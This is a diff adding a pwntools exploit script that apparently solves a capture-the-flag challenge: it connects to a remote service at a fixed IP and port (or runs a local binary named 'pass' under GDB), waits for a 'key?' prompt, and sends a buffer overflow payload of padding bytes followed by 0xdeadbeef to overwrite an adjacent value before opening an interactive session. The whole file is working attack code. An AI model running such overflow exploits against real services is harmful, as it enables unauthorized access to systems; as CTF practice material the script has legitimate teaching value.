@@ -1,0 +1,44 @@
+
+#!/usr/bin/env python3
+from pwn import *
+
+HOST = "140.110.112.77"
+PORT = "6125"
+FILENAME = "pass"
+
+host = args.HOST or HOST
+port = int(args.PORT or PORT)
+
+exe = ELF(FILENAME)
+
+gdbscript='''
+break main
+c
+'''
+
+def local():
+    context.terminal = ['tmux','splitw','-h']
+    context(log_level='debug')
+    if args.GDB:
+        return gdb.debug(exe.path, gdbscript)
+    else:
+        return process([exe.path])
+
+def remote():
+    io = connect(host, port)
+    return io
+
+start = local if args.LOCAL else remote
+
+#==================================================
+# Start pwn
+#==================================================
+io = start()
+
+print(io.recvuntil('key?'))
+
+payload = b'A'*(0x20-4) + p32(0xdeadbeef)
+
+io.sendline(payload)
+
+io.interactive()
